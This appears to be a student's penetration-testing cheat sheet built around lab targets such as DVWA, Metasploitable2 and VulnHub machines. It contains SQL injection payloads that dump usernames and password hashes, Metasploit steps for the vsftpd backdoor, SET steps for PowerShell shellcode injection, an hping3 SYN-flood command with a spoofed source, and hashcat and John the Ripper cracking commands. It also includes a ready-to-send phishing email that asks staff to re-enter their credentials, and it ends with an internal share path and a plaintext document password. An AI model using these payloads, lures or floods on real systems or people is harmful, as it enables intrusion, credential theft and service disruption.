# SQLi
When DVWA security is set to LOW:

1.)Reveals all user is:1' OR '1'='1'#

2.)Reveals name of all tables in the database:'UNION SELECT table_name, NULL FROM information_schema.tables#

3.)Reveals all the column names form 'users' table:'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#

4.)Reveals all the usernames and password hashes:'UNION SELECT user, password FROM users#

# Siteclone
https://facebook.com

# John the Ripper
https://www.stationx.net/how-to-use-hydra/

# netdiscover
Command | Explanation

sudo netdiscover | Auto-scans your current subnet to find live hosts.

sudo netdiscover -r 192.168.1.0/24 | Scans a specific subnet range manually.

sudo netdiscover -f | Performs a fast scan with less accuracy.

sudo netdiscover -i eth0 | Uses a specific network interface (e.g., eth0 or wlan0).

sudo netdiscover -r 192.168.1.0/24 > output.txt | Saves scan results to a text file.

sudo netdiscover -s | Continuously scans and updates live devices in real-time.

sudo netdiscover -p | Passive mode: silently listens to ARP traffic without sending packets.

# Phishing
Subject: [Action Required] System Security Update – Verify Your Account

Dear [Employee Name],

As part of our institution's routine security maintenance, we are rolling out an update to the internal login portal. To ensure uninterrupted access, all users are required to re-authenticate their credentials.

Please verify your account by visiting the secure portal at the link below:

https://institution-login-verification.example.com

This must be completed by 6:00 PM today to prevent temporary access restrictions.

Thank you for your prompt attention.

Sincerely,
IT Support Team
[Institution Name]

# Extra
* Metasploitable2 exploit:

https://rajeshmenghwar.medium.com/introduction-abdc1c5cd41b

search vsftpd
use exploit /unix/ftp/vsftpd_234_backdoor
show options
set rhosts 10.0.2.8
exploit


* Csec exploit:
https://medium.com/@sanjaisaayuj/csec-vulnhub-walk-through-d1de814a9f63

https://blog.razrsec.uk/basic-pentesting-1-walkthrough/

https://medium.com/@z6157881/basic-pentesting-1-walkthrough-vulnhub-00b1fe084167

* Corrosion2:
https://medium.com/@z6157881/corrosion-2-vulnhub-walkthrough-30c00787fa5d

https://www.hackingarticles.in/corrosion-2-vulnhub-walkthrough/


* SQL injections:
https://medium.com/@aayushtiruwa120/dvwa-sql-injection-91b4efb683e4

When DVWA security is set to LOW:
1.)Reveals all user is:1' OR '1'='1'#
2.)Reveals name of all tables in the database:'UNION SELECT table_name, NULL FROM information_schema.tables#
3.)Reveals all the column names form 'users' table:'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
4.)Reveals all the usernames and password hashes:'UNION SELECT user, password FROM users#


* SET alpha numeric:
sudo setoolkit
1) Social-Engineering Attacks
9) Powershell Attack Vectors
3) PowerShell Alphanumeric Shellcode Injector


* Dos Attack:
sudo hping3 -S <target IP> -a <fake src IP> -p <port(s)> --flood` | SYN Flood attack |
ip.addr==<kalivm>

* Passcracking:
 ?d = digit, ?l = lowercase, ?u = uppercase, ?s = special char

| Command                                                                                                     | Description         |
| ----------------------------------------------------------------------------------------------------------- | ------------------- |
| `hashcat -m <mode> -a <attack-mode> hash.txt wordlist.txt`                                                  | General format      |
| `sudo apt install wordlists`<br>`gunzip rockyou.txt.gz`                                                     | Install wordlists   |
| Modes: `0=MD5`, `100=SHA1`, `1700=SHA2-512`, `22000=WPA`                                                    | Hash types          |
| Masks: `?d?d?d?d`, `?l?l?l`, `?u?u`, `?a`                                                                   | Brute-force symbols |
| Attack Modes: `0=Dict`, `1=Combo`, `3=Brute`, `6=Hybrid Left`, `7=Hybrid Right`                             |                     |
| Options: `--session`, `--status`, `--force`, `-o`, `--remove`, `--benchmark`, `--restore`, `--potfile-path` |                     |


https://www.stationx.net/how-to-use-hydra/?utm_source=chatgpt.com

git clone https://github.com/openwall/john.git
cd john/run
office2john.py >> Helps extract password hashes from the documents
python3 office2john.py <Document.extension > = Password hash





















































________________________



\\\10.125.100.100    

The key to vapt docx is : PwD#2424
